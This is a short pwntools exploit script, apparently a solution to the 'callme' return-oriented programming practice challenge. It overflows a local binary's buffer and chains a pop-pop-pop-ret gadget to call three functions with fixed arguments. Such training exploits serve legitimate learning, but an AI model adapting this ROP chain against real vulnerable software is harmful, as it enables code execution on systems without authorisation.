from pwn import *

p = process("./callme")
callme_one_plt_address = 0x401850
callme_two_plt_address = 0x401870
callme_thress_plt_address = 0x401810
pop_pop_pop_ret_address = 0x401ab0
payload = flat(["A"*(0x20+8), pop_pop_pop_ret_address, 1, 2, 3, callme_one_plt_address, pop_pop_pop_ret_address, 1, 2, 3, callme_two_plt_address, pop_pop_pop_ret_address, 1, 2, 3, callme_thress_plt_address], word_size=64)
p.sendline(payload)
p.interactive()
